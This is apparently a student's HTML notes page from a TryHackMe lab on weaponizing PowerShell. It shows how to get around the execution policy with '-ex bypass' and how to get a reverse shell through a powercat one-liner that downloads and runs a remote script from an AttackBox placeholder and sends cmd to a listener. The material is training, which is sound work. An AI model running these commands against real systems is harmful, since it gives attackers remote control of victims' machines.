<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>PSH</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>PSH</h1><br/><p><strong><h1>Powershell - PSH</h1></strong></p><p></p><p></p><p>PowerShell is an object-oriented programming language executed from the Dynamic Language Runtime (DLR) in .NET with some exceptions for legacy uses. Check out the TryHackMe room, Hacking with PowerShell for more information about PowerShell.</p><p></p><p>Red teamers rely on PowerShell in performing various activities, including initial access, system enumerations, and many others. Let&#39;s start by creating a straightforward PowerShell script that prints &quot;Welcome to the Weaponization Room!&quot; as follows,</p><p></p><p><strong>Write-Output &quot;Welcome to the Weaponization Room!&quot;</strong></p><p></p><p>Save the file as <strong>thm.ps1</strong>. With the Write-Output, we print the message &quot;Welcome to the Weaponization Room!&quot; to the command prompt. Now let&#39;s run it and see the result.</p><p></p><p><strong>powershell -File thm.ps1</strong></p><p></p><p><img src="images/395-1.png" alt="images/395-1.png" /></p><p></p><p><strong><h3>Execution Policy</h3></strong></p><p></p><p>PowerShell&#39;s execution policy is a security option to protect the system from running malicious scripts. By default, Microsoft disables executing PowerShell scripts <strong>.ps1</strong> for security purposes. The PowerShell execution policy is set to Restricted, which means it permits individual commands but not run any scripts.</p><p></p><p>You can determine the current PowerShell setting of your Windows as follows,</p><p></p><p><strong>Get-ExecutionPolicy</strong></p><p></p><p><img src="images/395-2.png" alt="images/395-2.png" /></p><p></p><p>We can also easily change the PowerShell execution policy by running:</p><p></p><p><strong>Set-ExecutionPolicy -Scope CurrentUser RemoteSigned</strong></p><p></p><p><img src="images/395-3.png" alt="images/395-3.png" /></p><p></p><p></p><p><strong><h3>Bypass Execution Policy</h3></strong></p><p></p><p>Microsoft provides ways to disable this restriction. One of these ways is by giving an argument option to the PowerShell command to change it to your desired setting. For example, we can change it to bypass policy which means nothing is blocked or restricted. This is useful since that lets us run our own PowerShell scripts.</p><p></p><p>In order to make sure our PowerShell file gets executed, we need to provide the bypass option in the arguments as follows, </p><p></p><p><strong>powershell -ex bypass -File thm.ps1</strong></p><p></p><p><img src="images/395-4.png" alt="images/395-4.png" /></p><p></p><p></p><p><strong><h3>Gaining Reverse Shell Access Using Powershell</h3></strong></p><p></p><p>Now, let&#39;s try to get a reverse shell using one of the tools written in PowerShell, which is <strong>powercat</strong>. On your AttackBox, download it from GitHub and run a webserver to deliver the payload.</p><p></p><p>Link: <strong>https://github.com/besimorhino/powercat.git</strong> </p><p></p><p><img src="images/395-5.png" alt="images/395-5.png" /></p><p></p><p>Now, we need to set up a web server on that AttackBox to serve the <strong>powercat.ps1</strong> that will be downloaded and executed on the target machine. Next, <strong>change</strong> the <strong>directory</strong> to <strong>powercat</strong> and start <strong>listening</strong> on a port of your choice. In our case, we will be using port <strong>8080</strong></p><p></p><p><img src="images/395-6.png" alt="images/395-6.png" /></p><p></p><p>On the AttackBox, we need to listen on port <strong>1337</strong> using <strong>nc</strong> to receive the connection back from the victim.</p><p></p><p><img src="images/395-7.png" alt="images/395-7.png" /></p><p></p><p>Now, from the victim machine, we download the payload and execute it using PowerShell payload as follows,</p><p></p><p><strong>powershell -c &quot;IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://ATTACKBOX_IP:8080/powercat.ps1&#39;);powercat -c ATTACKBOX_IP -p 1337 -e cmd&quot;</strong></p><p></p><p>Now that we have executed the command above, the victim machine downloads the <strong>powercat.ps1</strong>  payload from our web server (on the AttackBox) and then executes it locally on the target using <strong>cmd.exe</strong> and sends a connection back to the AttackBox that is listening on port <strong>1337</strong>. After a couple of seconds, we should receive the connection call back:</p><p></p><p><img src="images/395-8.png" alt="images/395-8.png" /></p><p></p></div>
</body>
</html>
